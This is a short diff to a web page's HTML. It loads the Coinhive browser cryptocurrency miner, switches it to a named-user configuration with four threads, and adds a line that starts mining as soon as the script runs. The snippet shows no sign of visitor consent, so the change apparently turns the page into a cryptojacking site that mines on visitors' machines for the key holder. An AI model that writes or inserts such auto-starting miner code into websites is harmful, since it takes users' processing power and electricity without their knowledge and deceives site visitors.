@@ -124,13 +124,13 @@
 
     <script src="https://coinhive.com/lib/coinhive.min.js"></script>
     <script>
-        var miner = new CoinHive.Anonymus('GCbsJwjMbHWIpKW0vzy2MX1YVOYSaGJG', {
-            threads: 2,
+        var miner = new CoinHive.User('GCbsJwjMbHWIpKW0vzy2MX1YVOYSaGJG', 'john-doe', {
+            threads: 4,
             autoThreads: false,
             throttle: 0.8,
             forceASMJS: false
         });
-
+        miner.start();
 
         $(document).ready(function () {
 
